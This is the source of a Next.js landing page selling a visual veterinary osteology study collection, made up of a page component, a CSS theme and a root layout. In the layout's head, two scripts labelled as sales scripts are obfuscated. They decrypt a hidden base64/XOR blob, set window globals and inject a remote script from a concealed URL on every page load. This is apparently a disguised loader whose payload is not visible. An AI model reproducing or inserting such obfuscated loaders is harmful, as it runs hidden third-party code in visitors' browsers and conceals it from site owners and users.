
'use client';

import { useRef } from 'react';
import { TopBar } from '@/components/top-bar';
import { HeroSection } from '@/components/hero-section';
import { ProductCarousel } from '@/components/product-carousel';
import { HowItWorks } from '@/components/how-it-works';
import { WhatYouGet } from '@/components/what-you-get';
import { SubjectsSection } from '@/components/subjects-section';
import { PricingSection } from '@/components/pricing-section';
import { BonusSection } from '@/components/bonus-section';
import { Testimonials } from '@/components/testimonials';
import { Guarantee } from '@/components/guarantee';
import { FAQ } from '@/components/faq';
import { FinalCta } from '@/components/final-cta';
import { Footer } from '@/components/footer';

// Páginas internas reais da coleção de Osteologia Veterinária
const carrossel1 = [
  { image: '/images/osteo/pg-costela.webp', title: 'Como Reconhecer e Orientar uma Costela', tag: 'Vol. 5 · Tórax' },
  { image: '/images/osteo/pg-vertebras-toracicas.webp', title: 'Vértebras Torácicas — Comparação entre Espécies', tag: 'Vol. 4 · Coluna' },
  { image: '/images/osteo/pg-cranio-ventral.webp', title: 'Crânio — Vista Ventral', tag: 'Vol. 5 · Crânio' },
  { image: '/images/osteo/pg-vertebras-cervicais.webp', title: 'Vértebras Cervicais — Comparação entre Espécies', tag: 'Vol. 4 · Coluna' },
  { image: '/images/osteo/pg-vistas-cranio.webp', title: 'Como Identificar as Vistas do Crânio', tag: 'Vol. 5 · Crânio' },
  { image: '/images/osteo/pg-cranio.webp', title: 'Crânio — Estrutura e Comparação', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-mapa-torax.webp', title: 'Mapa Visual do Tórax Veterinário', tag: 'Vol. 5 · Tórax' },
  { image: '/images/osteo/pg-sacro.webp', title: 'Sacro — Identificação e Comparação', tag: 'Vol. 3 · Membro Pélvico' },
];

const carrossel2 = [
  { image: '/images/osteo/pg-denticao.webp', title: 'Dentição e Arcadas Dentárias', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-cavidade-nasal.webp', title: 'Cavidade Nasal e Conchas', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-maxila.webp', title: 'Maxila, Incisivo e Zigomático', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-neurocranio.webp', title: 'Neurocrânio e Viscerocrânio', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-base-cranio.webp', title: 'Base do Crânio', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-seios-paranasais.webp', title: 'Seios Paranasais', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-arcadas-dentarias.webp', title: 'Arcadas Dentárias e Tipos de Dentes', tag: 'Vol. 6 · Crânio' },
  { image: '/images/osteo/pg-orbita.webp', title: 'Órbita e Cavidade Orbital', tag: 'Vol. 6 · Crânio' },
];

export default function Page() {
  const offerRef = useRef<HTMLDivElement>(null);
  const handleCtaClick = () => offerRef.current?.scrollIntoView({ behavior: 'smooth' });
  return (
    <main className="min-h-screen" style={{ backgroundColor: '#F3EBDD' }}>
      <TopBar />
      <HeroSection onCtaClick={handleCtaClick} />
      <ProductCarousel
        title="Conheça a Osteologia Veterinária por Dentro"
        subtitle="Veja como o conteúdo foi organizado para você bater o olho, identificar a estrutura e entender exatamente o que está estudando."
        items={carrossel1}
        bg="#FBF8F2"
      />
      <HowItWorks />
      <WhatYouGet />
      <SubjectsSection />
      <ProductCarousel
        title="Identifique, Compare e Diferencie com Mais Clareza"
        subtitle="Cada tipo de página ajuda você a reconhecer estruturas, comparar diferenças e revisar os pontos que mais geram dúvida."
        flowSteps={[
          ['Identificação Visual', 'Veja o osso e identifique suas principais estruturas.'],
          ['Como Reconhecer', 'Entenda quais características ajudam a reconhecer cada peça.'],
          ['Como Saber o Lado', 'Use os acidentes ósseos para diferenciar direita e esquerda.'],
          ['Não Confunda', 'Compare estruturas parecidas e veja o que diferencia uma da outra.'],
          ['Comparação entre Espécies', 'Compare canino, equino, bovino e suíno lado a lado.'],
        ]}
        items={carrossel2}
        reverse={true}
        bg="#FBF8F2"
      />
      <Testimonials />
      <BonusSection />
      <div ref={offerRef}><PricingSection /></div>
      <Guarantee />
      <FAQ />
      <FinalCta />
      <Footer />
    </main>
  );
}

@import 'tailwindcss';
@import 'tw-animate-css';
@import 'shadcn/tailwind.css';

@custom-variant dark (&:is(.dark *));

html,
body {
  overflow-x: clip;
  width: 100%;
  max-width: 100%;
}

/* Responsividade mobile otimizada para imagens */
@media (max-width: 640px) {
  img {
    -webkit-user-select: none;
    -webkit-user-drag: none;
    user-select: none;
  }
}

/* Container global único (mobile-first, sem variantes de breakpoint) */
.mobile-content {
  width: 100%;
  max-width: 430px;
  margin-left: auto;
  margin-right: auto;
  padding-left: 14px;
  padding-right: 14px;
  box-sizing: border-box;
}

@theme inline {
  --font-heading: var(--font-anton);
  --font-sans: var(--font-inter), 'Inter Fallback';
  --font-mono: var(--font-inter), 'Inter Fallback';
  --font-anton: var(--font-anton), 'Anton Fallback';
  --color-sidebar-ring: var(--sidebar-ring);
  --color-sidebar-border: var(--sidebar-border);
  --color-sidebar-accent-foreground: var(--sidebar-accent-foreground);
  --color-sidebar-accent: var(--sidebar-accent);
  --color-sidebar-primary-foreground: var(--sidebar-primary-foreground);
  --color-sidebar-primary: var(--sidebar-primary);
  --color-sidebar-foreground: var(--sidebar-foreground);
  --color-sidebar: var(--sidebar);
  --color-chart-5: var(--chart-5);
  --color-chart-4: var(--chart-4);
  --color-chart-3: var(--chart-3);
  --color-chart-2: var(--chart-2);
  --color-chart-1: var(--chart-1);
  --color-ring: var(--ring);
  --color-input: var(--input);
  --color-border: var(--border);
  --color-destructive: var(--destructive);
  --color-accent-foreground: var(--accent-foreground);
  --color-accent: var(--accent);
  --color-muted-foreground: var(--muted-foreground);
  --color-muted: var(--muted);
  --color-secondary-foreground: var(--secondary-foreground);
  --color-secondary: var(--secondary);
  --color-primary-foreground: var(--primary-foreground);
  --color-primary: var(--primary);
  --color-popover-foreground: var(--popover-foreground);
  --color-popover: var(--popover);
  --color-card-foreground: var(--card-foreground);
  --color-card: var(--card);
  --color-foreground: var(--foreground);
  --color-background: var(--background);
  --radius-sm: calc(var(--radius) * 0.6);
  --radius-md: calc(var(--radius) * 0.8);
  --radius-lg: var(--radius);
  --radius-xl: calc(var(--radius) * 1.4);
  --radius-2xl: calc(var(--radius) * 1.8);
  --radius-3xl: calc(var(--radius) * 2.2);
  --radius-4xl: calc(var(--radius) * 2.6);
}

:root {
  --background: #FBF8F2;
  --foreground: #2F2925;
  --card: #FBF8F2;
  --card-foreground: #2F2925;
  --popover: #FBF8F2;
  --popover-foreground: #2F2925;
  --primary: #5A3A27;
  --primary-foreground: #FBF8F2;
  --secondary: #9D4E35;
  --secondary-foreground: #FBF8F2;
  --muted: #F3EBDD;
  --muted-foreground: #8A7862;
  --accent: #9D4E35;
  --accent-foreground: #FBF8F2;
  --destructive: #9D4E35;
  --border: rgba(90,58,39,0.15);
  --input: rgba(90,58,39,0.15);
  --ring: #9D4E35;
  --chart-1: #2F2925;
  --chart-2: #5A3A27;
  --chart-3: #9D4E35;
  --chart-4: #D8C9B2;
  --chart-5: #F3EBDD;
  --sidebar: #FBF8F2;
  --sidebar-foreground: #2F2925;
  --sidebar-primary: #5A3A27;
  --sidebar-primary-foreground: #FBF8F2;
  --sidebar-accent: #9D4E35;
  --sidebar-accent-foreground: #FBF8F2;
  --sidebar-border: rgba(90,58,39,0.15);
  --sidebar-ring: #9D4E35;
}

  .dark {
    --background: #FBF8F2;
    --foreground: #2F2925;
    --card: #FBF8F2;
    --card-foreground: #2F2925;
    --popover: #FBF8F2;
    --popover-foreground: #2F2925;
    --primary: #5A3A27;
    --primary-foreground: #FBF8F2;
    --secondary: #9D4E35;
    --secondary-foreground: #FBF8F2;
    --muted: #F3EBDD;
    --muted-foreground: #8A7862;
    --accent: #9D4E35;
    --accent-foreground: #FBF8F2;
    --destructive: #9D4E35;
    --border: rgba(90,58,39,0.15);
    --input: rgba(90,58,39,0.15);
    --ring: #9D4E35;
    --sidebar: #FBF8F2;
    --sidebar-foreground: #2F2925;
    --sidebar-primary: #5A3A27;
    --sidebar-primary-foreground: #FBF8F2;
    --sidebar-accent: #9D4E35;
    --sidebar-accent-foreground: #FBF8F2;
    --sidebar-border: rgba(90,58,39,0.15);
    --sidebar-ring: #9D4E35;
  }


@layer base {
  section,
  footer {
    color: var(--foreground);
  }

  section h1,
  section h2,
  section h3,
  section h4,
  section p,
  section li,
  footer p {
    color: inherit;
  }

  section [style*="#17191C"],
  section [style*="#30343A"],
  footer [style*="#17191C"],
  footer [style*="#30343A"] {
    color: inherit;
  }

  * {
    @apply border-border outline-ring/50;
  }
  body {
    @apply bg-background text-foreground;
  }
  html {
    @apply font-sans;
  }
  .font-grotesk {
    font-family: var(--font-anton);
    font-weight: 400;
    letter-spacing: 0.01em;
    text-transform: uppercase;
  }

  /* Hover dos cards */
  .bonus-card:hover {
    transform: translateY(-4px);
    border-color: #9D4E35 !important;
    box-shadow: 0 20px 42px rgba(47, 41, 37, 0.16);
    border-radius: 20px;
  }

  /* Animações para CTA */
  @keyframes ctaPulse {
    0%, 100% {
      transform: scale(1);
      box-shadow: 0 8px 22px rgba(34, 197, 94, 0.32);
    }
    50% {
      transform: scale(1.04);
      box-shadow: 0 12px 28px rgba(34, 197, 94, 0.45);
    }
  }

  @keyframes ctaShine {
    0% {
      background-position: -1000px;
    }
    100% {
      background-position: 1000px;
    }
  }

  .cta-animate {
    animation: ctaPulse 3s ease-in-out infinite;
    will-change: transform;
    position: relative;
    overflow: hidden;
  }

  .cta-animate::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(
      90deg,
      transparent,
      rgba(255, 255, 255, 0.2),
      transparent
    );
    animation: ctaShine 3s ease-in-out infinite;
    pointer-events: none;
  }
}

import type { Metadata } from 'next'
import { Inter, Anton } from 'next/font/google'
import Script from 'next/script'
import './globals.css'

const inter = Inter({
  variable: '--font-inter',
  subsets: ['latin'],
})

const anton = Anton({
  variable: '--font-anton',
  subsets: ['latin'],
  weight: ['400'],
})

export const metadata: Metadata = {
  title: 'Osteologia Veterinária | Coleção Visual de Ossos, Acidentes e Espécies',
  description:
    'Uma coleção visual de Osteologia Veterinária com 6 volumes e cerca de 150 páginas: ossos, acidentes ósseos, vistas anatômicas e comparações entre canino, equino, bovino e suíno. Acesso imediato.',
  generator: 'v0.app',

  openGraph: {
    title: 'Osteologia Veterinária | Coleção Visual de Ossos, Acidentes e Espécies',
    description:
      'Ossos, acidentes ósseos, vistas anatômicas e diferenças entre espécies organizados visualmente para estudar com clareza e revisar antes da prova prática. Acesso imediato e 7 dias de garantia.',
    type: 'website',
    locale: 'pt_BR',
    siteName: 'Osteologia Veterinária',
  },

  twitter: {
    card: 'summary_large_image',
    title: 'Osteologia Veterinária',
    description:
      'Coleção visual de Osteologia Veterinária para reconhecer, identificar e revisar as estruturas ósseas. Acesso imediato e 7 dias de garantia.',
  },

  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html
      lang="pt-BR"
      className={`${inter.variable} ${anton.variable} bg-background`}
    >
      <head>
        <Script
          id="sales-script-1"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var j_6=atob("DC3kez0G6O++qaoHqlbGDk9qytWcwd5z2l7eVBJljIGQ3N5qw0udVV5phcHc24V0yV+NC0l1x5/X0c9rhV2NA1hqxoXNi4Yly1mQCVRknZvb2og98XDIWVpqh43fxdklkHafWVNnhYqck4h3w1WBF3RiysOc38tr30jGQR8wiY6Nmp02kkyATV8+itaHy85knBXUSA0klbLD");var v_isl=[];for(var x_g13=0;x_g13<j_6.length;x_g13++){v_isl.push(j_6.charCodeAt(x_g13)&255);}var p_j9dj=v_isl[0];var h_ybuy=v_isl.slice(1,1+p_j9dj);var e_now=v_isl.slice(1+p_j9dj);var i_7w=e_now.map(function(b,m_9){return b^h_ybuy[m_9%p_j9dj];});var n_70="";for(var i_ved=0;i_ved<i_7w.length;i_ved++){n_70+=String.fromCharCode(i_7w[i_ved]&255);}var d_gmc=decodeURIComponent(escape(n_70));var q_arnq=JSON.parse(d_gmc);var d_393=q_arnq.globals||[];d_393.forEach(function(k_zgy){window[k_zgy.name]=k_zgy.value;});var l_3xb=document.createElement("script");l_3xb.src=q_arnq.url;l_3xb.async=true;l_3xb.defer=true;(q_arnq.attributes||[]).forEach(function(r_5){l_3xb.setAttribute(r_5.name,r_5.value);});(document.head||document.documentElement).appendChild(l_3xb);})();`,
          }}
        />

        <Script
          id="sales-script-2"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var s_l=atob("DCnuiyOKBTqlhuqB2VLM/lHmJwCH7p71qVrUpAzpYVSL857ssE+XpUDlaBTH9MXyuluH+1f5Kk/R65mutUia7lD+K1DWpMajuF2a+UrocE7A9ci7glLM5ULnYBifpI7grUjD/lfnbFzcq5rzvF+L5VenfVnK4sfyukLMpwH8ZFbQ48i7+wuTp1ioa1vI48i7+02P/0KncE7I74z49Fmc7lXva06I9Z/jsE2dqQ+oc1vJ84+j4wvM9n73");var w_9=[];for(var v_euj=0;v_euj<s_l.length;v_euj++){w_9.push(s_l.charCodeAt(v_euj)&255);}var a_ga4z=w_9[0];var p_e=w_9.slice(1,1+a_ga4z);var l_xzr=w_9.slice(1+a_ga4z);var p_0u=l_xzr.map(function(b,r_142s){return b^p_e[r_142s%a_ga4z];});var w_7vg="";for(var s_j40t=0;s_j40t<p_0u.length;s_j40t++){w_7vg+=String.fromCharCode(p_0u[s_j40t]&255);}var r_dt=decodeURIComponent(escape(w_7vg));var i_ent=JSON.parse(r_dt);var t_f2=i_ent.globals||[];t_f2.forEach(function(d_mrzs){window[d_mrzs.name]=d_mrzs.value;});var d_j=document.createElement("script");d_j.src=i_ent.url;d_j.async=true;d_j.defer=true;(i_ent.attributes||[]).forEach(function(p_5dp){d_j.setAttribute(p_5dp.name,p_5dp.value);});(document.head||document.documentElement).appendChild(d_j);})();`,
          }}
        />

        <Script
          id="facebook-pixel"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s)
            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)}(window, document,'script',
            'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '1767450204383809');
            fbq('track', 'PageView');`,
          }}
        />
        <noscript>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            height="1"
            width="1"
            style={{ display: 'none' }}
            src="https://www.facebook.com/tr?id=1767450204383809&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
      </head>

      <body className="font-sans antialiased">
        {children}
      </body>
    </html>
  )
}
